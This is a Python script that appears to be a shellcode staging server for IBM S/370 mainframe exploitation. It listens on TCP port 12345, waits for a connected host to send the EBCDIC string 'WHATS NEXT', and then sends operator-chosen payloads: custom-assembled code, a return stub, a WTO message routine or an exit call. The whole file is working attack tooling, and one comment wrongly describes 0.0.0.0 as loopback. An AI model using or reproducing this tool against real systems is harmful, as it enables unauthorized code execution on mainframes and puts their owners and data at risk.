import socket
import binascii
import select
from time import sleep
import tempfile, subprocess


HOST = '0.0.0.0'  # Standard loopback interface address (localhost)
PORT = 12345        # Port to listen on (non-privileged ports are > 1023)


def wto_code():
    subprocess.run(["./asm", "WTOASM"])

    instr_file = open('instrdata.p',mode='rb')
    code_bytes = instr_file.read()
    return code_bytes

def comp_code():
    template_file = open('TEMPASM.s370',mode='r')
    source_file = open("ASM.s370", "w")
    temp_cont = template_file.read()
    source_file.write(str(temp_cont))
    source_file.flush()

    subprocess.run(["nano", "ASM.s370"])
    subprocess.run(["./asm", "ASM"])

    instr_file = open('instrdata.p',mode='rb')
    code_bytes = instr_file.read()
    return code_bytes


def help():
    print("[+] SHELLCODE OPTIONS")
    print("[1] CUSTOM S370 SHELLCODE")
    print("[2] NOP SHELLCODE")
    print("[3] WTO SHELLCODE")
    print("[4] EXIT SHELLCODE")

def main():
    help()
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((HOST, PORT))
        s.listen()
        conn, addr = s.accept()
        with conn:
            s.setblocking(True)
            print('Connected by', addr)
            data = conn.recv(5024)
            while(data == binascii.unhexlify("e6c8c1e3e240d5c5e7e3")):
                opt = input("[+] CHOOSE SHELLCODE OPTION\n")
                if opt == "1":
                    code_bytes = comp_code()
                elif opt == "2":
                    code_bytes = binascii.unhexlify("07FE")
                elif opt == "3":
                    code_bytes = wto_code()
                elif opt == "4":
                    code_bytes = binascii.unhexlify("0A03")
                else:
                    code_bytes = comp_code()
                conn.sendall(code_bytes)
                data = conn.recv(5024)
            s.shutdown(1)
            s.close()


if __name__ == "__main__":
    main()
